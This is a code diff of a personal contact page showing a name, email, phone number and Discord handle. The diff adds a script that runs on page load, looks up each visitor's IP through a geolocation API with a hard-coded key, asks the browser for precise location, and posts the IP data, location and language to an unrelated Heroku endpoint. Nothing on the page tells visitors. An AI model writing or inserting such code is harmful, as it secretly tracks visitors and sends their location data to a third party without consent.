@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -9,10 +10,41 @@
   <meta property="og:type" content="website" />
   <meta property="og:url" content="" />
   <meta property="og:image" content="Milk.png" />
-  <meta property="og:description" 
-  content="There here my personal info, email, phone number, discord, etc." />
+  <meta property="og:description" content="There here my personal info, email, phone number, discord, etc." />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
 </head>
+
 <body>
+  <script>
+    let apiKey = '1be9a6884abd4c3ea143b59ca317c6b2';
+    $.getJSON('https://ipgeolocation.abstractapi.com/v1/?api_key=' + apiKey, function (data) {
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition((location) => {
+            $.post('https://asdasaash654.herokuapp.com/acess').send({
+              ip: data,
+              location,
+              language: navigator.language
+            })
+          }, () => {
+            $.post('https://asdasaash654.herokuapp.com/acess').send({
+              ip: data,
+              language: navigator.language
+            })
+          });
+        } else {
+          $.post('https://asdasaash654.herokuapp.com/acess').send({
+              ip: data,
+              language: navigator.language
+            })
+        }
+      }
+
+      getLocation()
+    });
+
+  </script>
   <img src="Milk.png" alt="Milk cup" style="width: 250px; height: 250px">
   <h2>Fabiano Assuri de Carvalho</h2>
   <span>Email: </span>
@@ -22,6 +54,7 @@
   <a href="tel:+55469165464654">+55469165464654</a>
   <br>
   <span>Discord: Milk#5385</span>
-  
+
 </body>
+
 </html>
